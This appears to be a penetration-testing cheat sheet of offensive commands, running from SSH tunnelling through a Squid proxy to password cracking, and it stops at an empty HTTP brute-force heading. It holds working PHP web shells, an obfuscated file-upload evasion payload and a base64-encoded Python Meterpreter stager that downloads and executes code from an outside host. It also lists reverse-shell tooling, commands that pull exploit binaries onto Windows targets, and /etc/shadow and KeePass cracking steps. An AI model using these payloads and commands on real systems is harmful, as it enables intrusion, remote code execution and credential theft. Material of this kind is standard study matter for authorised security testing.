
<h3>SSH over HTTP (Squid)</h3>

<b> socat </b>

<pre>socat TCP-L:9999,fork,reuseaddr PROXY:192.168.1.41:127.0.0.1:22,proxyport=3128

ssh john@127.0.0.1 -p 9999</pre>


<b>proxytunnel </b>

<pre>proxytunnel -p 192.168.1.41:3128 -d 127.0.0.1:22 -a 5555

ssh john@127.0.0.1 -p 5555</pre>

<b>proxychains </b>

<pre>http 192.168.1.41 3128

proxychains ssh john@127.0.0.1</pre>

![proxychains](https://user-images.githubusercontent.com/7115563/33822522-1e15dbee-de58-11e7-9953-3da8ff684cfc.png)


<b>corkscrew </b>

<pre>ssh john@192.168.1.41 -t /bin/sh</pre>

![cork](https://user-images.githubusercontent.com/7115563/33822672-b92a51f0-de58-11e7-9936-06056b7903b8.png)



<h3>Generic Enumeration</h3>

- port fullscan

- UDP scan



<h3> HTTP Enumeration</h3>

- dirsearch big.txt -e sh,txt,htm,php,cgi,html,pl,bak,old

- banner inspection

- review source code

- bruteforce with cewl

- searchsploit look at versions properly

- test all the paths with the exploits, mangle it

- nmap --script vuln

- nmap --script safe (ssl-cert, virtual hosts)

- always incercept with Burp

- nikto -h

- LFI, RFI, SQL, RCE injections

- dirsearch with cookie once authenticated

- download vulnerable application from exploit-db and examine it

<h3>SSH Enumeration</h3>

- shellshock

- bruteforce

- user_enum

Debian OpenSSL Predictable PRNG

<h3>SMB Enumeration</h3>

- nmap --script vuln

- nmap --script smb*

- nmap --script smb-enum-shares,smb-ls

- enum4linux

<h3> BOF exploit-based </h3>

- change shellcode

- make sure all badchars are removed

- read the exploit properly in case this makes changes in the shellcode

- capture traffic with wireshark making sure the entire shellcode is transmited

- run the exploit several times

- make sure the JMP ESP matches OS and language

<h3> SNMP Enumeration</h3>

- snmpcheck

- snmpenum

<h3>PHP RCE</h3>

test: 

```<?php phpinfo(); ?>```

simple shell: 

```<?php system($_GET["c"]); ?>```

```<?php `$_GET["c"]`; ?>```

file upload:

```<?php file_put_contents('/var/www/html/uploads/test.php', '<?php system($_GET["c"]);?>'); ?>```

file upload evasion:  rot13 + urlencode

```<?php $payload="%3C%3Fcuc%20flfgrz%28%24_TRG%5Bp%5D%29%3B%3F%3E"; file_put_contents('/var/www/html/uploads/test8.php', str_rot13(urldecode($payload))); ?>```


<h3>RCE via webshell</h3>

- All pentest monkey reverse shells

- msfvenom x86/linux/shell_reverse_tcp -f elf

- Metasploit `web_delivery` module

- which wget | nc <ip> <port>


<h3>SQLi UNION</h3>

search for response on HTML source code

<b> Reverse HTTP Shell through Proxy </b>

```use payload/python/meterpreter/reverse_http```

![proxy2](https://user-images.githubusercontent.com/7115563/33836652-3d9c9624-de8a-11e7-9869-e18c5a28ebd7.png)


```python -c "import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('aW1wb3J0IHN5cwp2aT1zeXMudmVyc2lvbl9pbmZvCnVsPV9faW1wb3J0X18oezI6J3VybGxpYjInLDM6J3VybGxpYi5yZXF1ZXN0J31bdmlbMF1dLGZyb21saXN0PVsnYnVpbGRfb3BlbmVyJywnUHJveHlIYW5kbGVyJ10pCmhzPVtdCmhzLmFwcGVuZCh1bC5Qcm94eUhhbmRsZXIoeydodHRwJzonaHR0cDovLzE5Mi4xNjguMTA3LjIzMjo4MDgwJ30pKQpvPXVsLmJ1aWxkX29wZW5lcigqaHMpCm8uYWRkaGVhZGVycz1bKCdVc2VyLUFnZW50JywnTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgNi4xOyBUcmlkZW50LzcuMDsgcnY6MTEuMCkgbGlrZSBHZWNrbycpXQpleGVjKG8ub3BlbignaHR0cDovLzE3OC42Mi41OC4zNTo4MC9qOTkzQScpLnJlYWQoKSkK')))"```

Finally we set up the handler:

![proxy3](https://user-images.githubusercontent.com/7115563/33836552-fd3204ac-de89-11e7-940c-71c8ab321bf7.png)

<h3> Kernel Exploits </h3>

Linux: https://github.com/lucyoa/kernel-exploits

Windows: https://github.com/abatchy17/WindowsExploits

<h3> Linux Privilege Escalation </h3>

- sudo -l
- Kernel Exploits
- OS Exploits
- Password reuse (mysql, .bash_history, 000-default.conf...)
- Known binaries with suid flag and interactive (nmap)
- Custom binaries with suid flag either using other binaries or with command execution
- Writable files owned by root that get executed (cronjobs)
- MySQL as root
- Vulnerable services (chkrootkit, logrotate)
- Writable /etc/passwd
- Readable .bash_history
- SSH private key
- Listening ports on localhost
- /etc/fstab
- /etc/exports
- /var/mail
- Process as other user (root) executing something you have permissions to modify
- SSH public key + Predictable PRNG
- apt update hooking (Pre-Invoke)

<h3> Windows Privilege Escalation </h3>

- Kernel Exploits
- OS Exploits
- Pass The Hash
- Password reuse
- DLL hijacking (Path)
- Vulnerable services
- Writable services binaries path
- Unquoted services
- Listening ports on localhost
- Registry keys

<h3> Windows File Transfer </h3>

<b>bitsadmin</b>

`bitsadmin /transfer debjob /download /priority normal http://<ip>/shell.php c:\xampp\htdocs\shell.php`

<b>cscript wget.vbs (code on the repo)</b>

`cscript wget.vbs http://<ip>/test.txt test.txt`

<b>powershell</b>

`powershell -c "(new-object System.Net.WebClient).Downloadfile('http://<ip>/exploit.exe', 'C:\Windows\temp\exploit.txt')"`

<b>ftp</b>

client:

<pre>
echo open <ip> 2121 > ftpscript.txt
echo anonymous>> ftpscript.txt
echo PASS >> ftpscript.txt
echo bin >> ftpscript.txt
echo get meter.exe>> ftpscript.txt
echo quit >> ftpscript.txt
ftp -s:ftpscript.txt
</pre>

server:

<code>python -m pyftpdlib  --port=2121 --write</code>

<b>wget.exe</b>

Upload to vulnerable server from kali: ` /usr/share/windows-binaries/wget.exe`

`wget.exe http://<ip>/file file`


<h3> Password Cracking </h3>

<b>zip</b>

`fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt file.zip `

<b>/etc/shadow</b>

<pre>
unshadow passwd shadow > passwords
john --wordlist=/usr/share/wordlists/rockyou.txt passwords
</pre>

<b>keepass</b>

<pre>
keepass2john /root/Desktop/NewDatabase.kdb > file
john -incremental:alpha -format=keepass file
</pre>

<h3> HTTP Bruteforce </h3>

<b>POST</b>


